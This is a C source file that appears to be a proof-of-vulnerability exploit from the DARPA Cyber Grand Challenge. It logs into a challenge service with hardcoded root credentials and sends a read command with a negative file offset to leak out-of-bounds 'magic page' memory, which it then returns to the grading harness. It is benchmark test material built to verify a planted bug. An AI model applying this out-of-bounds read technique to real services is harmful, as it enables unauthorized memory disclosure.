/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>

size_t ReadBytes( int fd, uint8_t *buf, size_t len ) 
{
	size_t total_bytes = 0;
	size_t rx_bytes;
	char c;
				        
	while (total_bytes < len) 
	{
		if (receive(fd, &c, 1, &rx_bytes) != 0) 
                	return(0);
								                
		if (rx_bytes == 0) 
			return (0);

		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

size_t SendBytes( int fd, uint8_t *buf, size_t len ) 
{
	size_t tx_bytes;
	size_t total_bytes = 0;

	while ( total_bytes < len )
	{
		if ( transmit( fd, buf+total_bytes, 1, &tx_bytes ) != 0 )
			return (0);

		if ( tx_bytes != 1 )
			return (0);

		total_bytes++;
	}

	return(total_bytes);
}

void NegotiateType2Pov( uint32_t *type2_addr, uint32_t *type2_size, uint32_t *type2_length)
{
        uint32_t PovType = 2;

        // Request Type 2 negotitation
        if ( SendBytes( 3, (uint8_t *)&PovType, 4 ) != 4)
                _terminate(-1);

        // get the 4-byte value for type2_addr
        if ( ReadBytes( 3, (uint8_t *)type2_addr, 4 ) != 4)
                _terminate(-1);

        // get the 4-byte size for type_size
        if ( ReadBytes( 3, (uint8_t *)type2_size, 4 ) != 4)
                _terminate(-1);

        // get the 4-byte value for type2_length
        if ( ReadBytes( 3, (uint8_t *)type2_length, 4 ) != 4)
                _terminate(-1);

}

void SendCommand( uint8_t commandNum, uint8_t *pCommandData, uint16_t commandLength )
{
	SendBytes( STDOUT, &commandNum, 1 );
	SendBytes( STDOUT, pCommandData, commandLength );
}

void GetResponse( uint8_t *pDest, uint16_t *pDestLen )
{
	// Read response header
	typedef struct RESPONSE_HEADER
	{
		uint8_t commandNum;
		uint8_t responseType;
		uint16_t responseLength;
	} __attribute__((packed)) tResponseHeader;

	tResponseHeader oHeader;

	if ( ReadBytes( STDIN, (uint8_t*)&oHeader, sizeof(oHeader) ) != sizeof(oHeader) )
		_terminate( -1 );

	if ( oHeader.responseLength > 0 )
	{
		if ( ReadBytes( STDIN, pDest, oHeader.responseLength ) != oHeader.responseLength )
			_terminate( -1 );
	}

	(*pDestLen) = oHeader.responseLength;
}

#define EAX_REG_NUM	(0)
#define ECX_REG_NUM	(1)
#define EDX_REG_NUM	(2)
#define EBX_REG_NUM	(3)
#define ESP_REG_NUM	(4)
#define EBP_REG_NUM	(5)
#define ESI_REG_NUM	(6)
#define EDI_REG_NUM	(7)

#define COMMAND_LOGIN	(0)
#define COMMAND_READ	(2)
#define COMMAND_WRITE	(3)

int main(void) 
{
	// Buffer for command data
	uint8_t commandData[1024];
	uint8_t responseData[4096];
	uint16_t responseLength;

	uint32_t type2_addr;
	uint32_t type2_size;
	uint32_t type2_length;
	
	// Type 2
	NegotiateType2Pov( &type2_addr, &type2_size, &type2_length );

	typedef struct LOGIN_STRUCT
	{
		uint8_t userNameLen;
		uint8_t passwordLen;
	} __attribute__((packed)) tLoginCommand;
	
	((tLoginCommand *)commandData)->userNameLen = 4;
	((tLoginCommand *)commandData)->passwordLen = 10;	// rootpasswd
	memcpy( ((char *)(commandData+2)), "root", 4 );
	memcpy( ((char *)(commandData+6)), "rootpasswd", 10 );

	// Login
	SendCommand( COMMAND_LOGIN, commandData, sizeof(tLoginCommand)+14 );
	GetResponse( responseData, &responseLength );

	// Create a file
	typedef struct WRITE_STRUCT
	{
		uint16_t writeLength;
		uint8_t fileNameLength;
	} __attribute__((packed)) tWriteCommand;
	
	((tWriteCommand *)commandData)->writeLength = 20;
	((tWriteCommand *)commandData)->fileNameLength = 6;
	memcpy( ((char *)(commandData+3)), "blahah", 6 );
	memcpy( ((char *)(commandData+9)), responseData, 20 );
	
	SendCommand( COMMAND_WRITE, commandData, sizeof(tWriteCommand)+26 );
	GetResponse( responseData, &responseLength );

	// Do read command (outside of bounds)
	typedef struct READ_STRUCT
	{
		int32_t fileOffset;
		uint16_t readLength;
		uint8_t fileNameLength;
	} __attribute__((packed)) tReadCommand;

	((tReadCommand *)commandData)->fileOffset = -1474560; // Get us to the magic page data!!!
	((tReadCommand *)commandData)->readLength = 0x1000;
	((tReadCommand *)commandData)->fileNameLength = 6;

	memcpy( ((char *)commandData+sizeof(tReadCommand)), "blahah", 6 );
	
	// Send debug command -- this will fail auth token!
	SendCommand( COMMAND_READ, commandData, sizeof(tReadCommand)+6 );
	GetResponse( responseData, &responseLength );

	// Send add geofence command
	SendBytes( 3, responseData+4, 4 );

	return 0;
}
